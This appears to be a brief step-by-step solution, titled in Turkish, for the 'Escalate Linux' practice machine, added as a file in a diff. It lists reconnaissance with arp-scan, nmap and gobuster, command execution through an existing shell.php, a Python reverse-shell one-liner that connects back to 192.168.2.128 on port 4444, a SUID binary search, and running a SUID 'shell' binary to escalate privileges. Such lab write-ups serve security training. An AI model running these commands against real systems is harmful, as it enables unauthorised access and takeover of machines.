@@ -1,0 +1,9 @@
+ESCALATE LINUX MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.105 bulundu.
+2 - nmap -A 192.168.2.105
+3 - gobuster dir -u http://192.168.2.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+4 - http://192.168.2.105/shell.php?cmd=id
+5 - python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.128",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+6 - find / -perm -u=s -type f 2>/dev/null
+7 - cd /home/user3
+8 - ./shell, whoami
